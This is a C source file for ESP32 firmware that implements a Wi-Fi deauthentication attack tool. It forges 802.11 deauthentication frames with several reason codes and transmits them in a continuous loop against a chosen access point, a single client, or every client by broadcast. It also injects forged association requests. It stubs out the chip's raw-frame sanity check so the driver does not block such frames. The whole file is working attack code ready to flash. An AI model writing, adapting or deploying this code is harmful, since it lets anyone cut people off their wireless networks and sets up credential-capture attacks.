// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "wifi_deauther.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "led_control.h"
#include <string.h>

static const char *TAG = "WIFI_DEAUTHER";

static const uint8_t deauth_frame_invalid_auth[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

static const uint8_t deauth_frame_inactivity[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x04, 0x00
};

static const uint8_t deauth_frame_class3[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x07, 0x00
};

static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
  switch (type) {
    case DEAUTH_INVALID_AUTH: return deauth_frame_invalid_auth;
    case DEAUTH_INACTIVITY: return deauth_frame_inactivity;
    case DEAUTH_CLASS3: return deauth_frame_class3;
    default: return deauth_frame_invalid_auth;
  }
}

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  if (ret != ESP_OK) {
    ESP_LOGD(TAG, "TX Fail: 0x%x", ret);
    led_blink_red();
  } else {
    led_blink_green();
  }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[26];
  memcpy(deauth_frame, frame_template, 26);

  memcpy(&deauth_frame[4], ap_record->bssid, 6);
  memcpy(&deauth_frame[10], ap_record->bssid, 6);
  memcpy(&deauth_frame[16], ap_record->bssid, 6);

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  wifi_deauther_send_raw_frame(deauth_frame, 26);
}

void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[26];
  memcpy(deauth_frame, frame_template, 26);

  memset(&deauth_frame[4], 0xFF, 6);
  memcpy(&deauth_frame[10], ap_record->bssid, 6);
  memcpy(&deauth_frame[16], ap_record->bssid, 6);

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  wifi_deauther_send_raw_frame(deauth_frame, 26);
}

void wifi_send_association_request(const wifi_ap_record_t *ap_record) {
  if (ap_record == NULL) return;

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);

  uint8_t packet[128]; 
  memset(packet, 0, sizeof(packet));
  int idx = 0;

  packet[idx++] = 0x00; packet[idx++] = 0x00; packet[idx++] = 0x3a; packet[idx++] = 0x01; 
  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;
  uint8_t my_mac[6]; esp_wifi_get_mac(WIFI_IF_STA, my_mac);
  memcpy(&packet[idx], my_mac, 6); idx += 6;
  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;
  packet[idx++] = 0x00; packet[idx++] = 0x00;

  packet[idx++] = 0x31; packet[idx++] = 0x04;
  packet[idx++] = 0x0A; packet[idx++] = 0x00;

  packet[idx++] = 0x00; 
  uint8_t ssid_len = strlen((char *)ap_record->ssid);
  packet[idx++] = ssid_len;
  memcpy(&packet[idx], ap_record->ssid, ssid_len); idx += ssid_len;

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  packet[idx++] = 0x01; packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates)); idx += sizeof(rates);

  uint8_t ext_rates[] = {0x0c, 0x12, 0x18, 0x60};
  packet[idx++] = 50; packet[idx++] = sizeof(ext_rates);
  memcpy(&packet[idx], ext_rates, sizeof(ext_rates)); idx += sizeof(ext_rates);

  wifi_deauther_send_raw_frame(packet, idx);
}

#define DEAUTHER_STACK_SIZE 4096
#define DEAUTHER_DELAY_MS 100

static TaskHandle_t deauth_task_handle = NULL;
static StackType_t *deauth_task_stack = NULL;
static StaticTask_t *deauth_task_tcb = NULL;
static bool is_running = false;

static wifi_ap_record_t g_target_ap;
static deauth_frame_type_t g_type;
static bool g_is_broadcast;
static bool g_has_client = false;
static uint8_t g_target_client[6];

static void deauth_task(void *pvParameters) {
  ESP_LOGI(TAG, "Deauther Task Started");

  const uint8_t *frame_template = get_deauth_frame_template(g_type);
  uint8_t frame[26];
  memcpy(frame, frame_template, 26);

  if (g_is_broadcast) {
    memset(&frame[4], 0xFF, 6);
  } else {
    if (g_has_client) {
      memcpy(&frame[4], g_target_client, 6);
    } else {
      memcpy(&frame[4], g_target_ap.bssid, 6);
    }
  }
  memcpy(&frame[10], g_target_ap.bssid, 6);
  memcpy(&frame[16], g_target_ap.bssid, 6);

  esp_wifi_set_channel(g_target_ap.primary, WIFI_SECOND_CHAN_NONE);

  while (is_running) {
    wifi_second_chan_t second;
    uint8_t current_channel;
    esp_wifi_get_channel(&current_channel, &second);
    if (current_channel != g_target_ap.primary) {
      esp_wifi_set_channel(g_target_ap.primary, WIFI_SECOND_CHAN_NONE);
    }

    wifi_deauther_send_raw_frame(frame, 26);
    vTaskDelay(pdMS_TO_TICKS(DEAUTHER_DELAY_MS));
  }

  deauth_task_handle = NULL;
  ESP_LOGI(TAG, "Deauther Task Ended");
  vTaskDelete(NULL);
}

bool wifi_deauther_start(const wifi_ap_record_t *ap_record, deauth_frame_type_t type, bool is_broadcast) {
  if (is_running) return false;
  if (ap_record == NULL) return false;

  // Clean up previous task memory if it wasn't freed
  if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
  if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }

  memcpy(&g_target_ap, ap_record, sizeof(wifi_ap_record_t));
  g_type = type;
  g_is_broadcast = is_broadcast;
  g_has_client = false;
  is_running = true;

  deauth_task_stack = (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  deauth_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (!deauth_task_stack || !deauth_task_tcb) {
    ESP_LOGE(TAG, "Failed to alloc Deauther Task PSRAM");
    if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
    if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }
    is_running = false;
    return false;
  }

  deauth_task_handle = xTaskCreateStatic(
    deauth_task,
    "deauth_task",
    DEAUTHER_STACK_SIZE,
    NULL,
    5,
    deauth_task_stack,
    deauth_task_tcb
  );

  return (deauth_task_handle != NULL);
}

bool wifi_deauther_start_targeted(const wifi_ap_record_t *ap_record, const uint8_t client_mac[6], deauth_frame_type_t type) {
  if (is_running) return false;
  if (ap_record == NULL || client_mac == NULL) return false;

  if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
  if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }

  memcpy(&g_target_ap, ap_record, sizeof(wifi_ap_record_t));
  memcpy(g_target_client, client_mac, sizeof(g_target_client));
  g_type = type;
  g_is_broadcast = false;
  g_has_client = true;
  is_running = true;

  deauth_task_stack = (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  deauth_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (!deauth_task_stack || !deauth_task_tcb) {
    ESP_LOGE(TAG, "Failed to alloc Deauther Task PSRAM");
    if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
    if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }
    is_running = false;
    return false;
  }

  deauth_task_handle = xTaskCreateStatic(
    deauth_task,
    "deauth_task",
    DEAUTHER_STACK_SIZE,
    NULL,
    5,
    deauth_task_stack,
    deauth_task_tcb
  );

  return (deauth_task_handle != NULL);
}

void wifi_deauther_stop(void) {
  if (is_running) {
    is_running = false;
    // Give task time to finish loop and delete itself
    vTaskDelay(pdMS_TO_TICKS(DEAUTHER_DELAY_MS + 50)); 
  }
}

bool wifi_deauther_is_running(void) {
  return is_running;
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}
